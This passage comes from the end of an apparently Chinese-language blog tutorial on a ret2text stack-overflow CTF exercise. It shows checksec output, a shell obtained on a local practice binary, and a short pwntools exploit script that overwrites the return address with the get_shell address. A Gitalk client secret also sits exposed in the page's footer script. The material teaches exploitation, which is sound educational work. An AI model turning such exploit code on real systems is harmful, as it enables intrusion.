</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/kali/Sec/PWN/Stack/ret2text&#39;</span>
</span></span><span class="line"><span class="cl">    Arch:     i386-32-little
</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
</span></span><span class="line"><span class="cl">    Stack:    No canary found
</span></span><span class="line"><span class="cl">    NX:       NX enabled
</span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
</span></span><span class="line"><span class="cl">$ ls
</span></span><span class="line"><span class="cl">exp_ret2text.py  pwndbg  ret2libc1  ret2libc2  ret2text
</span></span><span class="line"><span class="cl">$ whoami
</span></span><span class="line"><span class="cl">kira
</span></span></code></pre></div><h2 id="exp">EXP</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 运行这个本地程序</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./ret2text&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 接收输出</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="c1"># payload = b&#39;A&#39;*20 + p32(0x08048522)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 不建议使用IDA去获得地址，因为嘛= =还是尽可能用代码操作</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;ret2text&#34;</span><span class="p">)</span> <span class="c1"># 读取文件的信息</span>
</span></span><span class="line"><span class="cl"><span class="n">get_shell</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;get_shell&#34;</span><span class="p">]</span> <span class="c1"># 搜索&#34;符号&#34;get_shell</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">20</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">get_shell</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="c1">#投喂数据(虽说是恶意数据)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>  <span class="c1">#切换到交互模式</span>
</span></span></code></pre></div><h2 id="ref">Ref</h2>
<p><a class="link" href="https://blog.csdn.net/weixin_43833642/article/details/104175028"  target="_blank" rel="noopener"
    >https://blog.csdn.net/weixin_43833642/article/details/104175028</a></p>
<p><a class="link" href="https://blog.csdn.net/weixin_44932880/article/details/104092620"  target="_blank" rel="noopener"
    >https://blog.csdn.net/weixin_44932880/article/details/104092620</a></p>
<p><a class="link" href="https://blog.csdn.net/ylcangel/article/details/102625948"  target="_blank" rel="noopener"
    >二进制漏洞挖掘之栈溢出-开启RELRO_ylcangel的专栏-CSDN博客_partial relro</a></p>
<hr>
<p>To Be Continued .qaq.</p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/pwn/">PWN</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    

    <aside class="related-contents--wrapper">
    
    
        <h2 class="section-title">Related contents</h2>
        <div class="related-contents">
            <div class="flex article-list--tile">
                
                    
<article class="has-image">
    <a href="/posts/pwn6/">
        
        
            <div class="article-image">
                <img src="/posts/pwn6/cover.9ce3629f5f54def41971d23600c4a453_hu76ffa02a199d8318bcf8bc7fd89975bb_336695_250x150_fill_q75_box_smart1.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post PWN! PWN! PANG! Part6 --- ROP"
                        
                        data-hash="md5-nONin19U3vQZcdI2AMSkUw==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">PWN! PWN! PANG! Part6 --- ROP</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/posts/pwn5/">
        
        
            <div class="article-image">
                <img src="/posts/pwn5/cover.5f05682fb9be023753c14c7bf7b130e4_hu3166df2cafdca7684e1b9dcf3608c6c9_2294292_250x150_fill_q75_box_smart1.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post PWN! PWN! PANG! Part5 --- ret2shellcode"
                        
                        data-hash="md5-XwVoL7m&#43;AjdTwUx797Ew5A==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">PWN! PWN! PANG! Part5 --- ret2shellcode</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/posts/pwn3/">
        
        
            <div class="article-image">
                <img src="/posts/pwn3/cover.83e414d02bfc9f736e824b7f6cd9a9eb_huc93e8e51211b13db7df27f880625afbe_1479136_250x150_fill_q75_box_smart1.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post PWN! PWN! PANG! Part3 --- 栈溢出基础"
                        
                        data-hash="md5-g&#43;QU0Cv8n3Nugkt/bNmp6w==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">PWN! PWN! PANG! Part3 --- 栈溢出基础</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/posts/pwn2/">
        
        
            <div class="article-image">
                <img src="/posts/pwn2/cover.dfc14371a1ebc11e7a4c671f0b6a9755_hu3d6209426f4a4882dd231c4242aff084_2839967_250x150_fill_q75_box_smart1.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post PWN! PWN! PANG! Part2 --- 工具的使用"
                        
                        data-hash="md5-38FDcaHrwR56TGcfC2qXVQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">PWN! PWN! PANG! Part2 --- 工具的使用</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/posts/pwn1/">
        
        
            <div class="article-image">
                <img src="/posts/pwn1/cover.781de6edaf36962e5b0cc87723920ee2_hu576b02bd11baef12c82f0e62b58bf2a0_136072_250x150_fill_q75_box_smart1.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post PWN! PWN! PANG! Part1---基础知识"
                        
                        data-hash="md5-eB3m7a82li5bDMh3I5IO4g==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">PWN! PWN! PANG! Part1---基础知识</h2>
        </div>
    </a>
</article>
                
            </div>
        </div>
    
</aside>

     
    
        
    <div id="gitalk-container"></div>
<link
    rel="stylesheet"
    href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css"
/>
<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.18.0/js/md5.min.js"></script>
<script>
    const gitalk = new Gitalk({
        clientID: "350f7151191770b41225",
        clientSecret: "dfc2d6ff148e57ac47c9efedb4ddf9c370fc33f0",
        repo: "kira-pgr.github.io",
        owner: "Kira-Pgr",
        admin: ["Kira-Pgr"],
        distractionFreeMode: false, 
        id: md5(location.pathname), 
    });
    (function () {
        if (
            ["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1
        ) {
            document.getElementById("gitalk-container").innerHTML =
                "Gitalk comments not available by default when the website is previewed locally.";
            return;
        }
        gitalk.render("gitalk-container");
    })();
</script>



    

    
 
    
 
    
 
    
 
    
 
    
 
    
 
    
 
    
 
    
 
    
 
    
 
    
 
    
 
    
 
    
 
    
 
    
 
    
 
    
 
    
 
    
 
    
 
    
 
    


<br>
<br>

    <section class="copyright">
        <a>&copy; 
        
            2020 - 
        
        2022  PGR猫猫酱的博客</a>
    </section>
<br>
<span id="span"></span>
<script type="text/javascript">
    function runtime(){
        
        X = new Date("2022/01/26 8:32:00");
        Y = new Date();
        T = (Y.getTime()-X.getTime());
        M = 24*60*60*1000;
        a = T/M;
        A = Math.floor(a);
        b = (a-A)*24;
        B = Math.floor(b);
        c = (b-B)*60;
        C = Math.floor((b-B)*60);
        D = Math.floor((c-C)*60);
        
        span.innerHTML = "<a>本站已经在线运行: "+A+"天"+B+"小时"+C+"分"+D+"秒</a>"
    }
    setInterval(runtime, 1000);
</script>
<br>
<br>
      <a>共喵喵了5.1k字·共24篇文章</br><span></a>
</br>
</br>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
            >

            </main>
    
        <aside class="sidebar right-sidebar sticky">
            <section class="widget archives">
                <div class="widget-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



                </div>
                <h2 class="widget-title section-title">Table of contents</h2>
                
                <div class="widget--toc">
                    <nav id="TableOfContents">
  <ol>
    <li><a href="#必须有的前言">必须有的前言</a></li>
    <li><a href="#资料投放__">资料投放&gt;__&lt;</a></li>
    <li><a href="#补充知识点linux程序安全保护机制">补充知识点：Linux程序安全保护机制</a>
      <ol>
        <li><a href="#aslr-地址随机化技术">ASLR: 地址随机化技术</a></li>
        <li><a href="#pie-随机化elf文件映射地址">PIE: 随机化ELF文件映射地址</a></li>
        <li><a href="#the-nx-bitsnx-栈不可执行">The NX bits(NX): 栈不可执行</a></li>
        <li><a href="#canary-金丝雀--专门针对栈溢出的防护">Canary (金丝雀) : 专门针对栈溢出的防护</a></li>
        <li><a href="#relro-重定位信息不可写">RELRO: 重定位信息不可写</a></li>
      </ol>
    </li>
    <li><a href="#pwn-pwn-pang">PWN? PWN! PANG!</a>
      <ol>
        <li><a href="#前期准备">前期准备</a></li>
        <li><a href="#查看保护开启情况">查看保护开启情况</a></li>
        <li><a href="#反汇编分析">反汇编分析</a></li>
        <li><a href="#思路分析">思路分析</a></li>
        <li><a href="#精心构造恶意数据">精心构造恶意数据</a></li>
        <li><a href="#exploit">Exploit!</a></li>
        <li><a href="#运行攻击脚本">运行攻击脚本</a></li>
      </ol>
    </li>
    <li><a href="#exp">EXP</a></li>
    <li><a href="#ref">Ref</a></li>
  </ol>
</nav>
                </div>
            </section>
        </aside>
    

        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>
<script src="/js/snow.js"></script>

    </body>
</html>
